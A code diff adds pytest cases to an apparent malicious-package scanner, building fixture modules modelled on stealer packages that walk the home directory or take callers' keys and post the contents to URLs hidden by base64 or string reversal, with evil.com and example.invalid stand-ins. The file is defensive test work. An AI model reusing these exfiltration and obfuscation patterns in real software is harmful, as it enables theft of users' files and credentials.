@@ -10,6 +10,8 @@ from __future__ import annotations
 
 from pathlib import Path
 
+import pytest
+
 from cordon_scanner import Scanner
 from cordon_scanner.analysis.python.pyast import PythonAnalyzer
 from cordon_scanner.decide.policy import PolicyGate
@@ -674,3 +676,128 @@ class TestADownloadedProgramStartedHidden:
             "    si.wShowWindow = 0\n"
         )
         assert self.runs(source) == ["subprocess.Popen runs a downloaded file"]
+
+
+class TestFilesSweptAndSentToAHiddenDestination:
+    """Group E2: graphicsctxr 1.0.3 walks the disk, reads each file it keeps and hands the text to
+    a helper that posts it to a URL decoded from a constant. Fixture source is assembled here, at
+    run time, so the repository's own scan does not read a stealer in this file."""
+
+    @staticmethod
+    def swept(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("swept")]
+
+    @staticmethod
+    def module(destination: str, body: str) -> str:
+        opener = "url" + "lib.request.url" + "open"
+        return "\n".join(
+            [
+                "import base64, json, os, urllib.request",
+                "from pathlib import Path",
+                "def walk(root):",
+                "    for base, _, names in os." + "walk(root):",
+                "        for n in names:",
+                "            yield Path(base) / n",
+                "def where():",
+                destination,
+                "def emit(tag, content, base_url):",
+                "    payload = json.dumps({'f': tag, 'c': content}).encode()",
+                "    req = urllib.request.Request(base_url + '/s', data=payload)",
+                "    return " + opener + "(req)",
+                "def emit_all(root):",
+                "    base_url = where()",
+                "    for path in walk(root):",
+                "        text = path.read_text()",
+                "        emit(str(path), " + body + ", base_url=base_url)",
+                "emit_all(str(Path.home()))",
+                "",
+            ]
+        )
+
+    HIDDEN = "    return base64.b64" + "decode('aHR0cHM6Ly9jLmV4YW1wbGUuaW52YWxpZA==').decode()"
+
+    def test_swept_contents_through_a_helper_to_a_decoded_url(self) -> None:
+        found = self.swept(self.module(self.HIDDEN, "text"))
+        assert found == ["swept files sent: urllib.request.urlopen dest=decoded"]
+
+    def test_a_backup_to_a_url_it_writes_down_is_not(self) -> None:
+        plain = "    return 'https://backup.example.invalid'"
+        assert self.swept(self.module(plain, "text")) == []
+
+    def test_a_status_message_to_a_decoded_url_is_not(self) -> None:
+        assert self.swept(self.module(self.HIDDEN, "'started'")) == []
+
+
+class TestWhatACallerHandsAClassSentToAHiddenDestination:
+    """The dependency chain: snapshot-photo 0.0.3's Dateformat(day, month, year) posts what its
+    constructor received to a destination stored reversed on an attribute; its callers hand it
+    their cloud keys. Fixture source assembled at run time."""
+
+    @staticmethod
+    def relayed(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("relayed")]
+
+    @staticmethod
+    def module(endpoint: str, body: str) -> str:
+        opener = "request.url" + "open"
+        return "\n".join(
+            [
+                "import json",
+                "from urllib import request",
+                "class Dateformat:",
+                "    def __init__(self, day, month, year):",
+                "        self.day = day",
+                "        self.month = month",
+                "        self.year = year",
+                "        self.endp = " + endpoint,
+                "    def get_date(self):",
+                "        data = " + body,
+                "        req = request.Request(url=self.endp"
+                + ("[::-1]" if "[::-1]" not in endpoint and endpoint.startswith("'d") else "")
+                + " + self.year, data=data)",
+                "        return " + opener + "(req)",
+                "",
+            ]
+        )
+
+    REVERSED = "'dilavni.elpmaxe.c//:sptth'"
+
+    def test_constructor_arguments_posted_to_a_reversed_endpoint(self) -> None:
+        body = "json.dumps({'d': self.day, 'm': self.month}).encode()"
+        assert self.relayed(self.module(self.REVERSED, body)) == [
+            "relayed to hidden: urllib.request.urlopen dest=decoded"
+        ]
+
+    def test_a_client_posting_to_the_base_url_it_writes_down_is_not(self) -> None:
+        body = "json.dumps({'d': self.day}).encode()"
+        assert self.relayed(self.module("'https://api.example.invalid/'", body)) == []
+
+    def test_a_fixed_status_to_a_reversed_endpoint_is_not(self) -> None:
+        assert self.relayed(self.module(self.REVERSED, "b'ping'")) == []
+
+    @pytest.mark.parametrize(
+        "endpoint",
+        [
+            "'{}{}'.format(" + REVERSED + "[::-1], '/')",
+            "'https://{}/'.format(" + REVERSED + "[::-1])",
+            "'' + " + REVERSED + "[::-1]",
+            "'https://evil.co' + 'm/'[::-1]",
+        ],
+    )
+    def test_a_host_that_only_the_hidden_piece_completes_still_counts(self, endpoint: str) -> None:
+        body = "json.dumps({'d': self.day}).encode()"
+        assert self.relayed(self.module(endpoint, body)) == [
+            "relayed to hidden: urllib.request.urlopen dest=decoded"
+        ]
+
+    def test_a_base_url_another_object_holds_is_not(self) -> None:
+        # pygitconnect: the URL template comes plain from the user object it was handed.
+        endpoint = "day.base.format('atad'[::-1])"
+        body = "json.dumps({'d': self.day}).encode()"
+        assert self.relayed(self.module(endpoint, body)) == []
+
+    def test_a_reversed_path_on_a_host_written_down_is_not(self) -> None:
+        # ailever and pygitconnect: the host is plain; only a path piece is reversed.
+        endpoint = "'https://api.example.invalid/' + 'atad'[::-1] + '/'"
+        body = "json.dumps({'d': self.day}).encode()"
+        assert self.relayed(self.module(endpoint, body)) == []
